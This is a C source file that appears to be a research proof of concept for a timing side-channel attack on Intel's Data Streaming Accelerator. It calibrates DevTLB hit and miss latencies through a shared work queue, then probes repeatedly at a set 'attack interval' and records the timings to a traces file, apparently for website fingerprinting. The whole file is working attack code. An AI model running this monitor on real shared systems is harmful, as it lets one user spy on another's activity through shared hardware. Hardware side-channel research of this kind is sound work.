#include "dsa.h"

#define CALIBRATION_RUNS 10000
#define ATTACK_INTERVAL_US 10
#define DIFF_THRESHOLD 300
#define CALIBRATION_RETRIES 5
#define TRACE_BUFFER_SIZE 100000

#define UPDATE_THRESHOLD(hit, miss) ((hit * 34 + miss * 66) / 100)

uint64_t detection_threshold;
struct wq_info wq_info;
struct dsa_hw_desc desc = {};
struct dsa_completion_record comp __attribute__((aligned(32))) = {};

// traces
uint64_t trace_buffer[TRACE_BUFFER_SIZE];
int trace_index = 0;

static inline uint64_t probe_atc(struct dsa_completion_record* comp) {
    uint64_t start;
    comp->status = 0;
    desc.completion_addr = (uintptr_t) comp;
    enqcmd(wq_info.wq_portal, &desc);
    start = rdtsc();
    while (comp->status == 0);
    return rdtsc() - start;
}

// Save traces to file
void save_traces() {
    char filename[256] = "wf-traces.txt";
    FILE* fp = fopen(filename, "w");
    if (!fp) {
        fprintf(stderr, "[monitor] Failed to open file\n");
        return;
    }

    for (int i = 0; i < trace_index; i++)
        fprintf(fp, "%lu\n", trace_buffer[i]);
    
    fclose(fp);
    printf("[monitor] Saved to %s\n", filename);
}

int main(int argc, char *argv[]) {
    // Initialize work queue
    int rc = map_spec_wq(&wq_info, "/dev/dsa/wq0.1");
    if (rc) {
        fprintf(stderr, "[monitor] Failed to map work queue: %d\n", rc);
        return EXIT_FAILURE;
    }
    
    // Prepare NOOP descriptor
    desc.opcode = DSA_OPCODE_NOOP;
    desc.flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
    comp.status = 0;
    
    // Calibrate latencies
    int calib_retry = 0;
    struct dsa_completion_record comp_evict __attribute__((aligned(32))) = {};

calib:
    if (calib_retry++ > CALIBRATION_RETRIES) {
        printf("[cc_receiver] Calibration failed after %d retries\n", CALIBRATION_RETRIES);
        return EXIT_FAILURE;
    }
    
    uint64_t miss_total = 0, hit_total = 0;
    probe_atc(&comp);
    probe_atc(&comp_evict);

    for (int i = 0; i < CALIBRATION_RUNS; i++) {
        probe_atc(&comp_evict); // Evict DevTLB
        probe_atc(&comp);
        miss_total += probe_atc(&comp_evict);
        hit_total += probe_atc(&comp_evict); // Now in DevTLB
    }

    uint64_t avg_miss = miss_total / CALIBRATION_RUNS;
    uint64_t avg_hit = hit_total / CALIBRATION_RUNS;

    if (avg_miss <= avg_hit || avg_miss - avg_hit < DIFF_THRESHOLD) {
        printf("[INFO] Miss: %lu, Hit: %lu, Diff: %lu\n", 
               avg_miss, avg_hit, avg_miss - avg_hit);
        goto calib;
    }

    detection_threshold = UPDATE_THRESHOLD(avg_hit, avg_miss);
    
    printf("[INFO] Calibration results:\n");
    printf("\tDevTLB miss latency: %lu cycles\n", avg_miss);
    printf("\tDevTLB hit  latency: %lu cycles\n", avg_hit);
    printf("\tDetection threshold: %lu cycles\n", detection_threshold);
    
    uint64_t tmp = 0;
    while (trace_index < TRACE_BUFFER_SIZE) {
        enqcmd(wq_info.wq_portal, &desc);
        usleep(ATTACK_INTERVAL_US);
        trace_buffer[trace_index++] = probe_atc(&comp);
        // usleep(1);
    }
    
    save_traces();

    return EXIT_SUCCESS;
}
